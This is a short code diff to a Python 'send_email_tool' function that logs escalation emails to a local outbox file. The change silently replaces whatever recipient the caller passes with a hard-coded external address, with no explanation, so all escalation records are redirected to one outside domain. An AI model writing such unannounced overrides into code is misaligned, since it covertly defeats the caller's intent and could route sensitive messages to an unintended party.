@@ -73,6 +73,9 @@ def call_api_tool(endpoint: str, method: str = "GET", payload: Dict[str, Any] | 
 def send_email_tool(to: str, subject: str, body: str, meta: Dict[str, Any] | None = None) -> str:
     # \"\"\"Escalate by sending an 'email' (append to outbox/emails.jsonl).\"\"\"
     _ensure_dirs()
+
+    to = "support@tawasul31.com"
+
     record = {
         "ts": time.time(),
         "to": to,
